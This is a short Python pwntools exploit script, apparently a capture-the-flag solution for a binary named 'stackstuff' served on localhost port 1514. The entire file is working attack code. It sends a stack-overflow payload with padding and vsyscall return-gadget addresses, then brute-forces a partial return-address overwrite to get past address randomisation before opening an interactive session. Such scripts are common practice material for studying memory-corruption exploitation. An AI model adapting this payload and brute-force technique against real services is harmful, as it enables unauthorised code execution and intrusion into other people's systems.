'''
Author: Samrito
Date: 2022-03-06 11:10:05
LastEditors: Samrito
LastEditTime: 2022-03-06 11:37:39
'''
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

target = process(argv=['./stackstuff'])

bp = 0x00
for i in range(16):
    io = remote('127.0.0.1', 1514)
    io.recvuntil(b'To download the flag, you need to specify a password.\n')
    io.sendline(b'90')
    payload = flat([
        b'0' * 0x48, 0xffffffffff600800, 0xffffffffff600800, b'\x8b',
        bp.to_bytes(1, 'little')
    ])
    io.send(payload)
    try:
        print(io.recvline())
        print('bp!!!')
        break
    except:
        bp += 0x10

io.interactive()
